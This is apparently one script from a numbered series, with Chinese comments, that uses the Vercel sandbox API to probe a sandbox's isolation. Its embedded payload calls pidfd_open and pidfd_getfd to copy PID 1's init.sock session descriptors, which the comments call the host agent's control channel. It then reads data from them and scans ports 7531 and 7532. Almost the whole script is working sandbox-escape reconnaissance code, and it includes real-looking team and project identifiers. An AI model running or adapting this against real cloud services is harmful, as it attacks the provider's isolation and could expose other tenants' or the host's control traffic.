# 实验J160: pidfd_getfd 复制PID1的init.sock会话fd(7/8) + 读取会话数据
# j159: fd7/8 = init.sock已连接会话(宿主agent控制通道); /proc/1/fd open返回ENXIO
# 方法: cmdA pidfd_open+pidfd_getfd复制fd7/8; 成功后非阻塞读会话数据(只读, 不发送)
# cmdB: 修正tcp6解析 + 自身IP的7531/7532 banner
# 零破坏: 只读会话数据, 不发送任何数据
import json, time, urllib.request, urllib.error, sys, ctypes
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=15000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)

NAME = "expj160"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

CA = r'''
import os, ctypes, struct, errno, socket, time
out = open("/tmp/d160a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)

# uname 内核版本
import subprocess
def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("uname", sh("uname -r 2>&1"))

# pidfd_open(1, 0) syscall 434
SYS_pidfd_open = 434
SYS_pidfd_getfd = 438
libc.syscall.restype = ctypes.c_long
pidfd = libc.syscall(SYS_pidfd_open, 1, 0)
p("pidfd_open", pidfd, "errno", ctypes.get_errno() if pidfd < 0 else 0)

if pidfd >= 0:
    # pidfd_getfd(pidfd, fd, 0) - 需要 ptrace 模式权限
    for tgt_fd in [7, 8, 4]:
        ctypes.set_errno(0)
        newfd = libc.syscall(SYS_pidfd_getfd, pidfd, tgt_fd, 0)
        p("getfd", tgt_fd, "->", newfd, "errno", ctypes.get_errno() if newfd < 0 else 0)
        if newfd >= 0:
            # 测试读 (非阻塞, MSG_PEEK)
            try:
                s = socket.socket(fileno=newfd)
                s.setblocking(False)
                time.sleep(0.5)
                try:
                    d = s.recv(4096, socket.MSG_PEEK)
                    p("peek", tgt_fd, repr(d[:500]))
                except BlockingIOError:
                    p("peek", tgt_fd, "no data (would block)")
                except Exception as e:
                    p("peek", tgt_fd, "err", repr(e))
                # getsockopt SO_TYPE
                p("sockinfo", tgt_fd, "family", s.family, "type", s.type)
                try:
                    p("peername", tgt_fd, s.getpeername())
                except Exception as e:
                    p("peername err", repr(e))
                s.close()
            except Exception as e:
                p("sock test err", repr(e))
    os.close(pidfd)

p("=== DONE")
out.close()
'''

CB = r'''
import socket, struct, subprocess
out = open("/tmp/d160b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
# 解析自身IP: 从 /proc/net/fib_trie 找 /32 host LOCAL
p("=== FIB ===")
p(sh("cat /proc/net/fib_trie 2>&1 | grep -B1 '/32 host LOCAL'"))
# 解析 tcp6 的 v4-mapped 地址
lines = open("/proc/net/tcp6").read().splitlines()[1:]
my_addrs = set()
for ln in lines:
    parts = ln.split()
    if len(parts) < 2:
        continue
    laddr = parts[1].split(":")[0]
    if laddr.startswith("0000000000000000FFFF0000"):
        ip_hex = laddr[16:]
        try:
            ip4 = socket.inet_ntoa(struct.pack(">I", int(ip_hex, 16)))
            my_addrs.add(ip4)
        except Exception:
            pass
p("my_addrs", my_addrs)
p("=== PORT_PROBE ===")
for ip in list(my_addrs):
    for port in [7531, 7532]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.settimeout(1.5)
            d = b""
            try:
                d = s.recv(512)
            except Exception:
                pass
            s.close()
            p("OPEN", ip, port, repr(d[:200]))
        except Exception as e:
            p("ERR", ip, port, repr(e)[:80])
p("=== DONE")
out.close()
'''

run_cmd(sid, CA, "pidfd-dup", timeout=150)
catfile(sid, "/tmp/d160a.txt", "d160a", 6000)

run_cmd(sid, CB, "ip-ports2", timeout=120)
catfile(sid, "/tmp/d160b.txt", "d160b", 4000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
